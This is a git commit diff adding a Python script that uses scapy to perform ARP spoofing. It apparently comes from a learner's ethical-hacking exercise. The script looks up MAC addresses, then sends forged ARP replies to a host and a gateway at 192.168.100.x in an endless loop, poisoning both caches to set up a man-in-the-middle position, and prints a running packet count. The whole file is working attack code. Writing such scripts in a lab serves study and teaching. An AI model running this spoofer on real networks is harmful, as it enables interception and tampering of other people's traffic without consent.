ba7f546de60201715514093a2e38e753282e5e44
= <ndegwaofficial@gmail.com>
2020-03-19 09:51:36 +0300

    [Python3] Print Incremental Packet Count Dynamically

---
+++ arp_spoof/arp_spoof5_Python3.py
@@ -0,0 +1,32 @@
+import scapy.all as scapy
+import time
+
+#don't import sys
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+
+    arp_request_broadcast = broadcast/arp_request
+
+    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+
+
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+sent_packets_count = 0
+while True:
+    spoof("192.168.100.2", "192.168.100.1")
+    spoof("192.168.100.1", "192.168.100.2")
+    sent_packets_count = sent_packets_count + 2
+    #end is set to blank so that nothing is added to the end of the print statement
+    #\r -> tells python to print statement from start of the line (overwriting)
+    print("\r[+] Sent two packets" + str(sent_packets_count), end="")
+    time.sleep(2)
